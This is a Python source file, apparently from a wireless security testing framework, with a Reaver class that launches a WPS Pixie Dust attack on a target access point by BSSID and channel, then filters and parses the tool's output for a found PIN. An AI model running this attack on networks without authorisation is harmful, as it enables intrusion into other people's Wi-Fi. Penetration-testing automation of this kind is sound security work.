#!/usr/bin/env python3
from os import listdir, remove

from subprocess import run, TimeoutExpired, PIPE, STDOUT

from tests import Test
from tools.config import Config


class Reaver:

    def __init__(self):
        pass

    def clean(self):
        for file in listdir(Config.reaver_temp_files):
            if ".wpc" in file:
                remove(Config.reaver_temp_files + file)

    def attack_pixie(self, target):
        self.clean()
        self.killed = False
        res = ''

        try:
            proc = run(
                [Config.reaver_bin, "-i", Test.interface.name, "-b", target.bssid, "-c", target.channel, "-f", "-K",
                 "-vvv"], stdout=PIPE, stderr=STDOUT, timeout=Config.reaver_timeout)
        except TimeoutExpired as e:
            results = e.stdout.decode() + "Timeout! Killing..."
            self.killed = True
        else:
            results = proc.stdout.decode()
        results = results.split("\n", 5)[5]  # Removing the 5 first lines to enhance the result output
        # Removing the send_packet called from resend_last_packet() messages to enhance the result output
        for line in results.splitlines():
            if "send_packet called from resend_last_packet()" in line:
                continue
            else:
                res += line + '\n'
        return res

    def parse(self, res):
        for line in res.splitlines():
            if "WPS pin not found" in line or self.killed:
                self.killed = False
                return 1
        return 0
